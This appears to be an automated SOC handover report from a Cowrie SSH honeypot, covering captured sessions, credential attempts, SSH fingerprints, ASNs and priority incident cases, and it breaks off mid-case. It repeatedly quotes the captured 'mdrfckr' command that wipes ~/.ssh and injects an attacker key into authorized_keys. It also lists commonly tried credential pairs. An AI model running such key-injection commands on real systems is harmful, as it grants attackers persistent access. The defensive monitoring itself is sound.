# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-21 |
| **Generated At** | 2026-10-21T02:25:51Z |
| **Shift Time** | 02:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **41** |
| Confirmed Threats | **37** |
| False Positives Filtered | **4** (9.8%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **16** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **18** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **238** |
| Unique Credential Pairs | **182** |
| Unique Usernames | **40** |
| Unique Passwords | **112** |
| Successful Auth Pairs | **224** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 86 |
| `345gs5662d34` | 11 |
| `ubuntu` | 10 |
| `inspur` | 10 |
| `dell` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 21 |
| `12345678` | 12 |
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `1234` | 11 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `support` | `supportAtlanta` | 4 |
| `pi` | `starfish` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `andrey` | `123456` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `validator` | `validator` | `2.57.122.238` | 2026-10-21T00:00:23 |
| `root` | `jvbzd` | `222.97.112.179` | 2026-10-21T00:00:24 |
| `root` | `1qaz!QAZ!` | `10.0.0.73` | 2026-10-21T00:00:40 |
| `admin` | `admin` | `222.97.112.179` | 2026-10-21T00:00:58 |
| `admin` | `school` | `154.83.16.14` | 2026-10-21T00:01:08 |
| `345gs5662d34` | `345gs5662d34` | `154.83.16.14` | 2026-10-21T00:01:12 |
| `admin` | `3245gs5662d34` | `154.83.16.14` | 2026-10-21T00:01:13 |
| `lghkel	` | `zpz}ld	` | `222.97.112.179` | 2026-10-21T00:01:33 |
| `root` | `1qaz!QAZ!` | `103.211.76.8` | 2026-10-21T00:01:53 |
| `sol` | `sol123` | `2.57.122.238` | 2026-10-21T00:01:54 |
| `support` | `supportAtlanta` | `10.0.0.73` | 2026-10-21T00:02:03 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xd5\xd2\xc8\x8f\x8c\x8d'` | `222.97.112.179` | 2026-10-21T00:02:06 |
| `"??$` | `$1` | `222.97.112.179` | 2026-10-21T00:02:40 |
| `root` | `Temp` | `10.0.0.73` | 2026-10-21T00:02:42 |
| `ubuntu` | `123@qaz` | `217.60.255.130` | 2026-10-21T00:03:08 |
| `root` | `Near@123` | `217.60.255.130` | 2026-10-21T00:03:13 |
| `sol` | `123` | `2.57.122.238` | 2026-10-21T00:03:31 |
| `root` | `Temp` | `103.211.76.8` | 2026-10-21T00:03:56 |
| `root` | `1qaz!@#$` | `10.0.0.73` | 2026-10-21T00:04:44 |
| `sol` | `12345678` | `2.57.122.238` | 2026-10-21T00:05:15 |
_… 204 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **41** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 17 |
| Go SSH scanner | 3 |
| OpenSSH | 2 |
| AsyncSSH (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 11 | 6 |
| `671ac49b8bd6...` | Mirai/variant | 2 | 1 |
| `390ffe68a68c...` | Modern SSH client | 2 | 2 |
| `16443846184e...` | Generic scanner | 1 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 11 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `671ac49b8bd6...` | libssh | 2 | 1 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 2 | 2 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `419da4c91ddb...` | libssh | 1 | 1 | Modern SSH client |
| `d1c5d296d532...` | AsyncSSH (Python) | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.45.62`, `108.174.147.36`, `154.83.16.14`, `201.249.87.201`, `150.136.214.177`, `186.122.177.140`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **19** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 11 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS202412` | Omegatech LTD | 1 | HIGH |
| `AS204428` | SS-Net | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS8048` | CANTV Servicios, Venezuela | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (22)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1492cbbe4a69

| Field | Detail |
|---|---|
| **Source IP** | `222.97.112[.]179` |
| **First Seen** | 2026-10-21 00:00 |
| **Last Seen** | 2026-10-21 00:00 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:00:22` | `cowrie.session.connect` |
| `2026-10-21 00:00:24` | `cowrie.login.success` |
| `2026-10-21 00:00:24` | `cowrie.session.params` |
| `2026-10-21 00:00:25` | `cowrie.command.input` |
| `2026-10-21 00:00:25` | `cowrie.command.failed` |
| `2026-10-21 00:00:25` | `cowrie.command.input` |
| `2026-10-21 00:00:25` | `cowrie.command.failed` |
| `2026-10-21 00:00:26` | `cowrie.command.input` |
| `2026-10-21 00:00:26` | `cowrie.command.failed` |
| `2026-10-21 00:00:26` | `cowrie.command.input` |
| `2026-10-21 00:00:26` | `cowrie.command.failed` |
| `2026-10-21 00:00:26` | `cowrie.command.input` |
| `2026-10-21 00:00:26` | `cowrie.command.input` |
| `2026-10-21 00:00:26` | `cowrie.command.failed` |
| `2026-10-21 00:00:26` | `cowrie.command.failed` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `222.97.112[.]179` to AbuseIPDB if not already reported
- [ ] Block `222.97.112[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cccd9d97368a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-10-21 00:00 |
| **Last Seen** | 2026-10-21 00:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:00:22` | `cowrie.session.connect` |
| `2026-10-21 00:00:22` | `cowrie.client.version` |
| `2026-10-21 00:00:23` | `cowrie.client.kex` |
| `2026-10-21 00:00:23` | `cowrie.login.success` |
| `2026-10-21 00:00:24` | `cowrie.session.params` |
| `2026-10-21 00:00:24` | `cowrie.command.input` |
| `2026-10-21 00:00:24` | `cowrie.log.closed` |
| `2026-10-21 00:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54043b5eae6b

| Field | Detail |
|---|---|
| **Source IP** | `154.83.16[.]14` |
| **First Seen** | 2026-10-21 00:01 |
| **Last Seen** | 2026-10-21 00:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:01:07` | `cowrie.session.connect` |
| `2026-10-21 00:01:07` | `cowrie.client.version` |
| `2026-10-21 00:01:07` | `cowrie.client.kex` |
| `2026-10-21 00:01:08` | `cowrie.login.success` |
| `2026-10-21 00:01:09` | `cowrie.session.params` |
| `2026-10-21 00:01:09` | `cowrie.command.input` |
| `2026-10-21 00:01:09` | `cowrie.command.failed` |
| `2026-10-21 00:01:09` | `cowrie.log.closed` |
| `2026-10-21 00:01:10` | `cowrie.session.params` |
| `2026-10-21 00:01:10` | `cowrie.command.input` |
| `2026-10-21 00:01:11` | `cowrie.session.file_download` |
| `2026-10-21 00:01:11` | `cowrie.log.closed` |
| `2026-10-21 00:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.16[.]14` to AbuseIPDB if not already reported
- [ ] Block `154.83.16[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e1b8915850e

| Field | Detail |
|---|---|
| **Source IP** | `154.83.16[.]14` |
| **First Seen** | 2026-10-21 00:01 |
| **Last Seen** | 2026-10-21 00:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:01:11` | `cowrie.session.connect` |
| `2026-10-21 00:01:11` | `cowrie.client.version` |
| `2026-10-21 00:01:11` | `cowrie.client.kex` |
| `2026-10-21 00:01:12` | `cowrie.login.success` |
| `2026-10-21 00:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.16[.]14` to AbuseIPDB if not already reported
- [ ] Block `154.83.16[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2459d115ae8a

| Field | Detail |
|---|---|
| **Source IP** | `222.97.112[.]179` |
| **First Seen** | 2026-10-21 00:01 |
| **Last Seen** | 2026-10-21 00:02 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:01:31` | `cowrie.session.connect` |
| `2026-10-21 00:01:32` | `cowrie.login.failed` |
| `2026-10-21 00:01:33` | `cowrie.login.success` |
| `2026-10-21 00:01:34` | `cowrie.session.params` |
| `2026-10-21 00:01:34` | `cowrie.command.input` |
| `2026-10-21 00:01:34` | `cowrie.command.failed` |
| `2026-10-21 00:01:34` | `cowrie.command.input` |
| `2026-10-21 00:01:34` | `cowrie.command.failed` |
| `2026-10-21 00:01:35` | `cowrie.command.input` |
| `2026-10-21 00:01:35` | `cowrie.command.input` |
| `2026-10-21 00:01:35` | `cowrie.command.failed` |
| `2026-10-21 00:01:35` | `cowrie.command.failed` |
| `2026-10-21 00:02:05` | `cowrie.log.closed` |
| `2026-10-21 00:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.97.112[.]179` to AbuseIPDB if not already reported
- [ ] Block `222.97.112[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-295abc9d95b1

| Field | Detail |
|---|---|
| **Source IP** | `103.211.76[.]8` |
| **First Seen** | 2026-10-21 00:01 |
| **Last Seen** | 2026-10-21 00:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:01:52` | `cowrie.session.connect` |
| `2026-10-21 00:01:52` | `cowrie.client.version` |
| `2026-10-21 00:01:52` | `cowrie.client.kex` |
| `2026-10-21 00:01:53` | `cowrie.login.success` |
| `2026-10-21 00:01:54` | `cowrie.session.params` |
| `2026-10-21 00:01:54` | `cowrie.command.input` |
| `2026-10-21 00:01:54` | `cowrie.log.closed` |
| `2026-10-21 00:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.76[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.211.76[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c17e05458bf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-10-21 00:03 |
| **Last Seen** | 2026-10-21 00:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:03:07` | `cowrie.session.connect` |
| `2026-10-21 00:03:07` | `cowrie.client.version` |
| `2026-10-21 00:03:07` | `cowrie.client.kex` |
| `2026-10-21 00:03:08` | `cowrie.login.success` |
| `2026-10-21 00:03:09` | `cowrie.direct-tcpip.request` |
| `2026-10-21 00:03:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-10-21 00:03:09` | `cowrie.direct-tcpip.data` |
| `2026-10-21 00:03:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8904f87fe9b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.45[.]62` |
| **First Seen** | 2026-10-21 00:29 |
| **Last Seen** | 2026-10-21 00:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:29:42` | `cowrie.session.connect` |
| `2026-10-21 00:29:42` | `cowrie.client.version` |
| `2026-10-21 00:29:42` | `cowrie.client.kex` |
| `2026-10-21 00:29:43` | `cowrie.login.success` |
| `2026-10-21 00:29:45` | `cowrie.session.params` |
| `2026-10-21 00:29:45` | `cowrie.command.input` |
| `2026-10-21 00:29:45` | `cowrie.command.failed` |
| `2026-10-21 00:29:46` | `cowrie.log.closed` |
| `2026-10-21 00:29:46` | `cowrie.session.params` |
| `2026-10-21 00:29:46` | `cowrie.command.input` |
| `2026-10-21 00:29:46` | `cowrie.session.file_download` |
| `2026-10-21 00:29:46` | `cowrie.log.closed` |
| `2026-10-21 00:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.45[.]62` to AbuseIPDB if not already reported
- [ ] Block `165.154.45[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0372621ce98e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.45[.]62` |
| **First Seen** | 2026-10-21 00:29 |
| **Last Seen** | 2026-10-21 00:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:29:47` | `cowrie.session.connect` |
| `2026-10-21 00:29:47` | `cowrie.client.version` |
| `2026-10-21 00:29:47` | `cowrie.client.kex` |
| `2026-10-21 00:29:48` | `cowrie.login.success` |
| `2026-10-21 00:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.45[.]62` to AbuseIPDB if not already reported
- [ ] Block `165.154.45[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86dc74ffa464

| Field | Detail |
|---|---|
| **Source IP** | `201.249.87[.]201` |
| **First Seen** | 2026-10-21 00:29 |
| **Last Seen** | 2026-10-21 00:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:29:57` | `cowrie.session.connect` |
| `2026-10-21 00:29:57` | `cowrie.client.version` |
| `2026-10-21 00:29:57` | `cowrie.client.kex` |
| `2026-10-21 00:29:58` | `cowrie.login.success` |
| `2026-10-21 00:29:58` | `cowrie.session.params` |
| `2026-10-21 00:29:58` | `cowrie.command.input` |
| `2026-10-21 00:29:58` | `cowrie.command.failed` |
| `2026-10-21 00:29:59` | `cowrie.log.closed` |
| `2026-10-21 00:29:59` | `cowrie.session.params` |
| `2026-10-21 00:29:59` | `cowrie.command.input` |
| `2026-10-21 00:29:59` | `cowrie.session.file_download` |
| `2026-10-21 00:29:59` | `cowrie.log.closed` |
| `2026-10-21 00:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.87[.]201` to AbuseIPDB if not already reported
- [ ] Block `201.249.87[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a20a231fc34

| Field | Detail |
|---|---|
| **Source IP** | `201.249.87[.]201` |
| **First Seen** | 2026-10-21 00:29 |
| **Last Seen** | 2026-10-21 00:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:29:59` | `cowrie.session.connect` |
| `2026-10-21 00:29:59` | `cowrie.client.version` |
| `2026-10-21 00:29:59` | `cowrie.client.kex` |
| `2026-10-21 00:30:00` | `cowrie.login.success` |
| `2026-10-21 00:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.87[.]201` to AbuseIPDB if not already reported
- [ ] Block `201.249.87[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80f4d225e40f

| Field | Detail |
|---|---|
| **Source IP** | `150.136.214[.]177` |
| **First Seen** | 2026-10-21 00:30 |
| **Last Seen** | 2026-10-21 00:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:30:03` | `cowrie.session.connect` |
| `2026-10-21 00:30:03` | `cowrie.client.version` |
| `2026-10-21 00:30:03` | `cowrie.client.kex` |
| `2026-10-21 00:30:03` | `cowrie.login.success` |
| `2026-10-21 00:30:03` | `cowrie.session.params` |
| `2026-10-21 00:30:03` | `cowrie.command.input` |
| `2026-10-21 00:30:03` | `cowrie.command.failed` |
| `2026-10-21 00:30:03` | `cowrie.log.closed` |
| `2026-10-21 00:30:04` | `cowrie.session.params` |
| `2026-10-21 00:30:04` | `cowrie.command.input` |
| `2026-10-21 00:30:04` | `cowrie.session.file_download` |
| `2026-10-21 00:30:04` | `cowrie.log.closed` |
| `2026-10-21 00:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.214[.]177` to AbuseIPDB if not already reported
- [ ] Block `150.136.214[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc5712d8ac4b

| Field | Detail |
|---|---|
| **Source IP** | `150.136.214[.]177` |
| **First Seen** | 2026-10-21 00:30 |
| **Last Seen** | 2026-10-21 00:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:30:04` | `cowrie.session.connect` |
| `2026-10-21 00:30:04` | `cowrie.client.version` |
| `2026-10-21 00:30:04` | `cowrie.client.kex` |
| `2026-10-21 00:30:04` | `cowrie.login.success` |
| `2026-10-21 00:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.214[.]177` to AbuseIPDB if not already reported
- [ ] Block `150.136.214[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41fb8d1a25a7

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-10-21 00:31 |
| **Last Seen** | 2026-10-21 00:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:31:44` | `cowrie.session.connect` |
| `2026-10-21 00:31:44` | `cowrie.client.version` |
| `2026-10-21 00:31:44` | `cowrie.client.kex` |
| `2026-10-21 00:31:44` | `cowrie.login.success` |
| `2026-10-21 00:31:45` | `cowrie.direct-tcpip.request` |
| `2026-10-21 00:31:46` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 00:31:46` | `cowrie.direct-tcpip.data` |
| `2026-10-21 00:31:47` | `cowrie.direct-tcpip.request` |
| `2026-10-21 00:31:48` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 00:31:48` | `cowrie.direct-tcpip.data` |
| `2026-10-21 00:31:52` | `cowrie.direct-tcpip.request` |
| `2026-10-21 00:31:53` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 00:31:53` | `cowrie.direct-tcpip.data` |
| `2026-10-21 00:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-703aa2204e5f

| Field | Detail |
|---|---|
| **Source IP** | `120.48.84[.]2` |
